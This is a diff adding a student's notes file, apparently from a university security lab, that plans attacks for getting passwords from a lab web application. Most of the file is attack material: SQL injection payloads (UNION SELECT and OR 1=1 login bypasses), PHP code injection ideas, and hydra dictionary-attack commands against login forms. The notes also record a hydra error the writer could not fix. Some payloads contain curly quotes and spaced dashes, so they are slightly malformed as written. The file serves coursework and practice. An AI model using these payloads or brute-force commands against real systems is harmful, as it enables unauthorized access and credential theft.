@@ -1,0 +1,57 @@
+LUIZA'S ATTEMPTS ~~~~ 
+
+Possible ways of getting the passwords:
+
+trying SQL injection when we wanna sort the members page
+	-in the type variable
+trying sql injection when trying to log in
+	-in the user variable
+	-in the pass variable
+	-in the login variable
+trying sql injection when forgot password
+
+try php code injection in all of the above
+
+for the SQL injections…try:
+	zzz’ UNION ALL SELECT database() #
+	zzz’ UNION ALL SELECT database() - - 
+	zzz” UNION ALL SELECT database() #
+	zzz” UNION ALL SELECT database()  - -
+	zzz”; $a = mysql_query(' UNION ALL SELECT database()
+ ’); echo($a);
+	zzz”; $a = mysql_query(' UNION ALL SELECT database()
+ ’); print($a);
+
+for the php injections just try substituting the variables for:
+	echo(“whatever”);
+	print(“whatever”);
+
+————
+Online dictionary attack using hydra
+
+command:
+hydra -L logins.txt -P american-english.txt http://comp535-lampvm2.cs.unc.edu http-post-form “/faq.php:user=^USER^&pass=^PASS^&login=Login:Invalid username” -V
+I keep getting this error:
+[ERROR] optional parameter must start with a '/' slash!
+
+dawid@lab:~$ hydra -L list_user -P list_password 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed" -V
+
+All attempts to change the call didnt work… 
+————
+Next attempt:
+SQL INJECTION OF or 1=1 IN LOGIN
+	IN USER
+	zz‘ OR ‘1’=‘1'
+	zz“ OR ‘1’ = ‘1’
+	zz‘ OR ‘1’=‘1’ #
+	zz“ OR ‘1’ = ‘1’ #
+	IN PASSWORD
+	zz‘ OR ‘1’=‘1'
+	zz“ OR ‘1’ = ‘1’
+	zz‘ OR ‘1’=‘1’ #
+	zz“ OR ‘1’ = ‘1’ #
+	IN BOTH
+	zz‘ OR ‘1’=‘1'
+	zz“ OR ‘1’ = ‘1’
+	zz‘ OR ‘1’=‘1’ #
+	zz“ OR ‘1’ = ‘1’ #
